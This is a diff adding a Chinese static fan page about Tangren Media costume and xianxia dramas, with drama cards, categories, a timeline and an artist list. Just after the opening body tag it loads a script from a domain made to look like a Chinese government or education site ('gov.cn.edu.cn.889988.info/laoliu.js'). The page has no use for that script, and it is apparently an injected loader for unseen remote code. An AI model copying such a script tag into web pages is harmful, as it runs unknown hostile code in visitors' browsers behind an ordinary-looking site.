@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>唐人影视 - 仙剑/步步惊心/无心法师 经典影视馆 | tangrenyingshi-h5.github.io</title>
+<meta name="description" content="唐人影视(tangrenyingshi-h5.github.io)收录仙剑奇侠传、步步惊心、射雕英雄传、无心法师等唐人出品剧集，古装、仙侠、悬疑、都市分类清晰，移动端流畅观看。" />
+<meta name="keywords" content="唐人影视,tangrenyingshi-h5,仙剑奇侠传,步步惊心,无心法师,古装剧,国产剧" />
+<style>
+:root{
+  --paper:#f7f1e3;
+  --paper2:#efe6d2;
+  --ink:#241c17;
+  --ink2:#4a3b30;
+  --ink3:#7a6655;
+  --red:#b23a2e;
+  --red2:#d8553f;
+  --green:#5b7553;
+  --line:#d8c7a8;
+  --gold:#b9912f;
+  --shadow:0 10px 30px rgba(80,50,20,.12);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Noto Serif SC","Songti SC","SimSun",serif;
+  background:
+    radial-gradient(1200px 500px at 50% -10%,#fff7e8 0%,var(--paper) 60%) fixed;
+  color:var(--ink);
+  line-height:1.8;
+}
+a{color:var(--red);text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 卷轴头 */
+.scroll-head{
+  position:relative;
+  padding:90px 20px 70px;
+  text-align:center;
+  border-bottom:3px double var(--line);
+  overflow:hidden;
+}
+.scroll-head::before,.scroll-head::after{
+  content:"";position:absolute;top:0;width:14px;height:100%;
+  background:linear-gradient(var(--line),var(--paper2),var(--line));
+}
+.scroll-head::before{left:0}
+.scroll-head::after{right:0}
+.seal{
+  display:inline-flex;align-items:center;justify-content:center;
+  width:64px;height:64px;border-radius:10px;
+  background:var(--red);color:#fff7e8;font-weight:900;font-size:26px;
+  box-shadow:0 6px 18px rgba(178,58,46,.4);
+  margin-bottom:18px;font-family:"KaiTi","STKaiti",serif;
+}
+.scroll-head h1{
+  font-size:46px;letter-spacing:6px;color:var(--ink);
+  text-shadow:0 2px 0 #fff;
+}
+.scroll-head h1 b{color:var(--red)}
+.scroll-head p{
+  max-width:640px;margin:18px auto 0;color:var(--ink2);font-size:17px;
+}
+.scroll-nav{
+  margin-top:26px;display:flex;gap:12px;justify-content:center;flex-wrap:wrap;
+}
+.scroll-nav a{
+  padding:10px 22px;border:1px solid var(--line);border-radius:30px;
+  background:rgba(255,255,255,.5);font-weight:700;font-size:15px;color:var(--ink2);
+}
+.scroll-nav a:hover{background:var(--red);color:#fff7e8;border-color:var(--red)}
+
+/* 容器 */
+.wrap{max-width:1120px;margin:0 auto;padding:64px 20px 40px}
+.sec{margin-bottom:72px;scroll-margin-top:24px}
+.sec-head{display:flex;align-items:baseline;gap:14px;margin-bottom:26px}
+.sec-head .cn{
+  font-size:28px;font-weight:900;color:var(--ink);letter-spacing:3px;
+}
+.sec-head .en{font-size:13px;color:var(--ink3);letter-spacing:2px;text-transform:uppercase}
+.sec-head .rule{flex:1;height:2px;background:repeating-linear-gradient(90deg,var(--line) 0 8px,transparent 8px 14px)}
+
+/* 经典剧目：窗棂卡片 */
+.drama-grid{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:22px;
+}
+.drama{
+  background:linear-gradient(160deg,#fffdf6,var(--paper2));
+  border:1px solid var(--line);border-radius:14px;overflow:hidden;
+  box-shadow:var(--shadow);transition:.25s;position:relative;
+}
+.drama:hover{transform:translateY(-4px);border-color:var(--red)}
+.drama .cover{
+  height:170px;display:flex;align-items:center;justify-content:center;
+  font-size:54px;
+  background:
+    linear-gradient(rgba(255,255,255,.25),rgba(0,0,0,.05)),
+    repeating-linear-gradient(45deg,#efe2c4 0 12px,#f6ecd6 12px 24px);
+  border-bottom:1px solid var(--line);
+}
+.drama .body{padding:16px 18px}
+.drama h3{font-size:19px;color:var(--ink);margin-bottom:6px}
+.drama .tag{
+  display:inline-block;font-size:12px;color:var(--red);
+  border:1px solid var(--red);border-radius:20px;padding:2px 10px;margin:0 6px 8px 0;
+}
+.drama p{font-size:14px;color:var(--ink2)}
+
+/* 分类：锦囊 */
+.pouch-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:18px}
+.pouch{
+  text-align:center;padding:28px 18px;border-radius:16px;
+  background:rgba(255,255,255,.55);border:1px dashed var(--green);
+  transition:.25s;
+}
+.pouch:hover{background:var(--green);color:#f7f1e3;border-color:var(--green)}
+.pouch .ico{font-size:34px;margin-bottom:10px}
+.pouch h3{font-size:18px;margin-bottom:6px}
+.pouch p{font-size:13px;opacity:.8}
+
+/* 年表 */
+.timeline{position:relative;padding-left:26px;border-left:3px solid var(--line)}
+.year{margin-bottom:26px;position:relative}
+.year::before{
+  content:"";position:absolute;left:-36px;top:6px;width:14px;height:14px;border-radius:50%;
+  background:var(--red);border:3px solid var(--paper);
+}
+.year b{font-size:20px;color:var(--red);margin-right:10px}
+.year span{font-size:15px;color:var(--ink2)}
+
+/* 艺人廊 */
+.cast{display:flex;gap:14px;flex-wrap:wrap}
+.cast figure{
+  width:120px;text-align:center;background:#fffdf6;border:1px solid var(--line);
+  border-radius:12px;padding:14px 8px;
+}
+.cast .avatar{
+  width:72px;height:72px;margin:0 auto 10px;border-radius:50%;
+  background:radial-gradient(circle at 30% 30%,#f3e3c2,#d9c39a);
+  display:flex;align-items:center;justify-content:center;font-size:30px;color:var(--ink3);
+}
+.cast figcaption{font-size:14px;color:var(--ink)}
+
+/* 关于 */
+.about{
+  background:linear-gradient(160deg,#fffdf6,var(--paper2));
+  border:1px solid var(--line);border-left:6px solid var(--red);
+  border-radius:14px;padding:32px;font-size:16px;color:var(--ink2);
+}
+
+footer{
+  text-align:center;padding:30px 20px;color:var(--ink3);
+  border-top:3px double var(--line);font-size:13px;
+}
+
+@media(max-width:768px){
+  .scroll-head{padding:70px 16px 50px}
+  .scroll-head h1{font-size:30px;letter-spacing:3px}
+  .scroll-nav a{padding:12px 18px;font-size:14px}
+  .wrap{padding:48px 16px 30px}
+  .sec-head .cn{font-size:22px}
+  .drama .cover{height:140px;font-size:42px}
+  .cast figure{width:104px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="scroll-head">
+  <div class="seal">唐</div>
+  <h1>唐人<b>影视</b></h1>
+  <p>唐人影视（tangrenyingshi-h5.github.io）——仙剑、步步惊心、射雕、无心法师，一页看尽唐人出品的古装、仙侠与悬疑精品。</p>
+  <nav class="scroll-nav">
+    <a href="#">首页</a>
+    <a href="#drama">经典剧目</a>
+    <a href="#cat">频道分类</a>
+    <a href="#about">关于唐人</a>
+  </nav>
+</header>
+
+<main class="wrap">
+
+  <!-- 经典剧目 -->
+  <section class="sec" id="drama">
+    <div class="sec-head">
+      <span class="cn">经典剧目</span>
+      <span class="en">Classic Dramas</span>
+      <span class="rule"></span>
+    </div>
+    <div class="drama-grid">
+      <article class="drama">
+        <div class="cover">⚔️</div>
+        <div class="body">
+          <h3>仙剑奇侠传</h3>
+          <span class="tag">仙侠</span><span class="tag">经典</span>
+          <p>李逍遥与赵灵儿的山海情缘，国产仙侠剧里程碑之作。</p>
+        </div>
+      </article>
+      <article class="drama">
+        <div class="cover">👑</div>
+        <div class="body">
+          <h3>步步惊心</h3>
+          <span class="tag">清穿</span><span class="tag">权谋</span>
+          <p>若曦穿越康熙朝，九子夺嫡中的儿女情长，古装言情标杆。</p>
+        </div>
+      </article>
+      <article class="drama">
+        <div class="cover">🐺</div>
+        <div class="body">
+          <h3>无心法师</h3>
+          <span class="tag">悬疑</span><span class="tag">民国</span>
+          <p>不死无心行走民国乱世，网剧精品化先河，诡谲又温柔。</p>
+        </div>
+      </article>
+      <article class="drama">
+        <div class="cover">🏮</div>
+        <div class="body">
+          <h3>射雕英雄传</h3>
+          <span class="tag">武侠</span><span class="tag">金庸</span>
+          <p>郭靖黄蓉江湖路，唐人新版武侠回归扎实叙事与服化道。</p>
+        </div>
+      </article>
+      <article class="drama">
+        <div class="cover">📜</div>
+        <div class="body">
+          <h3>三国机密</h3>
+          <span class="tag">历史</span><span class="tag">权谋</span>
+          <p>东汉末年的双生棋局，朝堂、兵法与医毒交织的暗战。</p>
+        </div>
+      </article>
+      <article class="drama">
+        <div class="cover">🌸</div>
+        <div class="body">
+          <h3>轩辕剑之天之痕</h3>
+          <span class="tag">仙侠</span><span class="tag">游戏改</span>
+          <p>宇文拓与陈靖仇的救世之旅，东方奇幻美术浓墨重彩。</p>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 频道分类 -->
+  <section class="sec" id="cat">
+    <div class="sec-head">
+      <span class="cn">频道分类</span>
+      <span class="en">Channels</span>
+      <span class="rule"></span>
+    </div>
+    <div class="pouch-grid">
+      <div class="pouch"><div class="ico">🗡️</div><h3>古装剧</h3><p>仙侠 / 武侠 / 清穿</p></div>
+      <div class="pouch"><div class="ico">🕯️</div><h3>悬疑奇情</h3><p>无心法师 / 探案</p></div>
+      <div class="pouch"><div class="ico">🏙️</div><h3>都市剧</h3><p>完美伴侣 / 女性题材</p></div>
+      <div class="pouch"><div class="ico">🎭</div><h3>艺人经纪</h3><p>胡歌 / 刘诗诗 / 林更新</p></div>
+    </div>
+  </section>
+
+  <!-- 年表 -->
+  <section class="sec">
+    <div class="sec-head">
+      <span class="cn">唐人年表</span>
+      <span class="en">Timeline</span>
+      <span class="rule"></span>
+    </div>
+    <div class="timeline">
+      <div class="year"><b>2005</b><span>《仙剑奇侠传》走红，唐人古装仙侠风格立住。</span></div>
+      <div class="year"><b>2011</b><span>《步步惊心》引爆清穿剧热潮。</span></div>
+      <div class="year"><b>2015</b><span>《无心法师》开启网剧精品化时代。</span></div>
+      <div class="year"><b>2021</b><span>《完美伴侣》《妻子的选择》切入现代都市。</span></div>
+      <div class="year"><b>2023</b><span>《风月锦囊》回归古装悬疑探案。</span></div>
+    </div>
+  </section>
+
+  <!-- 艺人廊 -->
+  <section class="sec">
+    <div class="sec-head">
+      <span class="cn">艺人廊</span>
+      <span class="en">Artists</span>
+      <span class="rule"></span>
+    </div>
+    <div class="cast">
+      <figure><div class="avatar">🎩</div><figcaption>胡歌</figcaption></figure>
+      <figure><div class="avatar">🌷</div><figcaption>刘诗诗</figcaption></figure>
+      <figure><div class="avatar">🗡</div><figcaption>袁弘</figcaption></figure>
+      <figure><div class="avatar">❄️</div><figcaption>林更新</figcaption></figure>
+      <figure><div class="avatar">🌙</div><figcaption>娜扎</figcaption></figure>
+      <figure><div class="avatar">🎐</div><figcaption>韩东君</figcaption></figure>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section class="sec" id="about">
+    <div class="sec-head">
+      <span class="cn">关于唐人</span>
+      <span class="en">About</span>
+      <span class="rule"></span>
+    </div>
+    <div class="about">
+      唐人影视以制作古装电视剧起家，出品《仙剑奇侠传》《步步惊心》《射雕英雄传》《无心法师》《三国机密》等作品，
+      被市场誉为“制造精品”的实力派公司。本站 tangrenyingshi-h5.github.io 为影视内容导航演示页，
+      按剧目、分类、年表与艺人整理唐人系片单，方便观众快速找回那些年追过的唐人剧。
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  © 2026 唐人影视 | tangrenyingshi-h5.github.io | 本页为静态单页演示，内链以 # 占位，不生成 robots.txt / sitemap.xml
+</footer>
+
+</body>
+</html>
